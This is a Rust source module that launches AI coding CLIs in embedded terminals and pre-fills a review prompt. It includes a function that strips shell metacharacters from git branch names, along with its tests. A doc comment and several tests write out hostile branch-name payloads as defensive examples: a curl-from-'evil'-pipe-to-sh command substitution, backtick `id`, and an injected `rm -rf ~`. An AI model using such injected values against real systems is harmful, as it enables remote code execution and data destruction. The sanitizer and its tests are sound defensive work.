//! Diff review-terminal model (prd-ai-in-diff-2026-Q3.md, revised 2026-06-01).
//!
//! Human-in-the-loop by design: clicking Review picks one or more CLIs and opens
//! a REAL terminal pane per CLI in the branch's worktree, launches the CLI, and
//! PRE-FILLS its input with a compact review prompt (the user submits). No
//! headless ACP session - you see exactly what the agent does, in a real
//! terminal. See [[feedback-human-in-loop-no-headless]]. This module owns the
//! embedded terminal entity, CLI table, prompt builder, and shell-aware launch
//! request used by `DiffView`.

use gpui::{Entity, SharedString};

/// A review CLI running in a real terminal embedded under a diff column.
pub(crate) struct ReviewTerminal {
    pub(crate) label: SharedString,
    pub(crate) terminal: Entity<crate::terminal::TerminalView>,
    pub(crate) prompt_ready: bool,
    pub(crate) prompt: Option<String>,
}

/// A CLI coding agent Paneflow can launch in a terminal for a review. Unlike the
/// ACP layer (Claude Code + Codex only), the terminal path supports every CLI -
/// it just spawns the binary in a shell.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum ReviewCli {
    ClaudeCode,
    Codex,
    OpenCode,
    Pi,
}

impl ReviewCli {
    /// All targets, in menu order.
    pub(crate) fn all() -> [ReviewCli; 4] {
        [Self::ClaudeCode, Self::Codex, Self::OpenCode, Self::Pi]
    }

    pub(crate) fn label(self) -> &'static str {
        match self {
            Self::ClaudeCode => "Claude Code",
            Self::Codex => "Codex",
            Self::OpenCode => "OpenCode",
            Self::Pi => "Pi",
        }
    }

    fn command(self) -> &'static str {
        match self {
            Self::ClaudeCode => "claude",
            Self::Codex => "codex",
            Self::OpenCode => "opencode",
            Self::Pi => "pi",
        }
    }

    /// Shell-aware command that clears the pane and launches the interactive
    /// CLI. Mirrors the existing pane launch buttons (`pane.rs`).
    pub(crate) fn launch_command(self, config: &paneflow_config::schema::PaneFlowConfig) -> String {
        crate::terminal::shell::clear_then(self.command(), config.default_shell.as_deref())
    }
}

/// Strip shell-active characters from a git ref before it is interpolated into
/// the review prompt. The prompt is PRE-FILLED into a terminal; if the chosen
/// CLI is absent the text lands on a live shell, where the template's backticks
/// and `$(...)` would execute an attacker-named branch (e.g. `x$(curl evil|sh)`
/// or `` x`id` ``, both legal git refs reachable via a crafted `.git/HEAD`) as a
/// command on submit. `parse_head` already drops control bytes for every
/// consumer; this is the prompt-context guard that additionally removes the
/// shell metacharacters that are legitimate in the sidebar but dangerous here.
///
/// U-006: this is a DENYLIST, not an allowlist. The old allowlist (alphanumeric
/// plus `/._-+@`) silently corrupted revspec operators the app itself emits:
/// `HEAD~1` became `HEAD1` and `main^` became `main`, so the review ran against
/// a nonexistent base. We instead drop only the shell-active set
/// (`` ` `` `$ ; | & ( ) < > ' " \ * ? [ ] { }`) plus whitespace and control
/// chars, so valid revspec characters (`~ ^ : @ / . - _ +`) pass through.
fn sanitize_ref_for_prompt(reference: &str) -> String {
    // `!` triggers bash history expansion (on by default in interactive bash),
    // so it joins the set even though it isn't a classic metacharacter - it is
    // not a revspec operator, so dropping it never corrupts an app-emitted ref.
    const SHELL_ACTIVE: &[char] = &[
        '`', '$', ';', '|', '&', '(', ')', '<', '>', '\'', '"', '\\', '*', '?', '[', ']', '{', '}',
        '!',
    ];
    reference
        .chars()
        .filter(|c| !c.is_control() && !c.is_whitespace() && !SHELL_ACTIVE.contains(c))
        .collect()
}

/// Build the compact, human-in-loop review prompt to PRE-FILL into the CLI input.
/// The CLI runs in the worktree cwd, so it inspects the diff itself via git -
/// transparent (you see it run `git diff`) and tiny (no pasted diff). When
/// `adversarial`, ask it to play the skeptical second reviewer (used for the
/// 2nd CLI in a multi-CLI "second opinion").
pub(crate) fn build_cli_review_prompt(branch: &str, base: &str, adversarial: bool) -> String {
    // Both refs flow into a backtick/`$(...)` template that can reach a live
    // shell, so neutralize shell metacharacters before interpolation (f001
    // residual: parse_head strips control bytes but not `` ` ``/`$`).
    let branch = sanitize_ref_for_prompt(branch);
    let base = sanitize_ref_for_prompt(base);
    let base = if base.trim().is_empty() {
        "the base branch".to_string()
    } else {
        base
    };
    let lens = if adversarial {
        "Be a skeptical second reviewer: actively hunt for what a first pass would miss. "
    } else {
        ""
    };
    format!(
        "Review the changes this branch (`{branch}`) adds vs `{base}`, including uncommitted work. \
         Inspect the diff yourself with git (e.g. `git diff $(git merge-base HEAD {base})` plus \
         `git status`). {lens}Review ONLY the changed lines for bugs, security issues, regressions, \
         and broken invariants - skip style nits unless harmful. Give a one-line verdict (SAFE or \
         the top concern), then findings as `path:line [blocker|suggestion|nit] note`."
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn launch_commands_are_distinct_and_bare() {
        let cmds: Vec<&str> = ReviewCli::all().iter().map(|cli| cli.command()).collect();
        assert_eq!(cmds.len(), 4);
        assert!(cmds.contains(&"claude"));
        assert!(cmds.contains(&"codex"));
        assert!(cmds.contains(&"opencode"));
        assert!(cmds.contains(&"pi"));
    }

    #[test]
    fn prompt_references_branch_base_and_git_not_pasted_diff() {
        let p = build_cli_review_prompt("feat/x", "develop", false);
        assert!(p.contains("feat/x"));
        assert!(p.contains("develop"));
        assert!(p.contains("git diff"));
        assert!(p.contains("path:line"));
        assert!(!p.contains("@@")); // no pasted diff
        assert!(!p.contains("skeptical second reviewer"));
    }

    #[test]
    fn empty_base_has_sensible_fallback() {
        let p = build_cli_review_prompt("feat/x", "", false);
        assert!(p.contains("the base branch"));
    }

    #[test]
    fn adversarial_adds_skeptic_framing() {
        let p = build_cli_review_prompt("feat/x", "develop", true);
        assert!(p.contains("skeptical second reviewer"));
    }

    #[test]
    fn sanitize_ref_keeps_legit_refs_and_drops_shell_metacharacters() {
        // Legit refs pass through untouched.
        assert_eq!(sanitize_ref_for_prompt("feat/x-1.2_3"), "feat/x-1.2_3");
        assert_eq!(
            sanitize_ref_for_prompt("release/v0.3.8+meta@1"),
            "release/v0.3.8+meta@1"
        );
        // Shell-active characters are removed.
        assert_eq!(sanitize_ref_for_prompt("x`id`"), "xid");
        assert_eq!(sanitize_ref_for_prompt("a$(b);c|d&e"), "abcde");
        // `!` (bash history expansion) is neutralized too.
        assert_eq!(sanitize_ref_for_prompt("feat/x!ls"), "feat/xls");
    }

    #[test]
    fn sanitize_ref_preserves_revspec_operators() {
        // U-006: the app itself emits these (per-commit toggle `HEAD~1`, the
        // free-text base picker `main^` / `v1.0~3`). The old allowlist dropped
        // `~`/`^`, corrupting the base; the denylist must pass them through.
        assert_eq!(sanitize_ref_for_prompt("HEAD~1"), "HEAD~1");
        assert_eq!(sanitize_ref_for_prompt("main^"), "main^");
        assert_eq!(sanitize_ref_for_prompt("v1.0~3"), "v1.0~3");
        assert_eq!(sanitize_ref_for_prompt("HEAD~2^"), "HEAD~2^");
        // A newline + shell metacharacters (e.g. from a crafted ref) are still
        // neutralized; only the inert `~` survives.
        assert_eq!(sanitize_ref_for_prompt("main\n; rm -rf ~"), "mainrm-rf~");
    }

    #[test]
    fn shell_metacharacters_in_branch_do_not_survive_into_prompt() {
        // f001 residual: a branch named via a crafted `.git/HEAD` (e.g.
        // `x$(curl evil|sh)`, a legal single-line git ref that survives the
        // control-byte strip in parse_head) must not reach the prefilled prompt
        // as live command substitution - the template wraps {branch} in
        // backticks and the text can land on a live shell if the CLI is absent.
        let p = build_cli_review_prompt("x$(curl evil.sh|sh)`id`", "main", false);
        assert!(
            p.contains("xcurlevil.shshid"),
            "sanitized branch text should remain, got: {p}"
        );
        assert!(!p.contains("$(curl"), "no attacker command substitution");
        assert!(!p.contains("|sh"), "no pipe-to-shell");
        assert!(
            !p.contains("`id`"),
            "no backtick substitution from the branch"
        );
    }
}
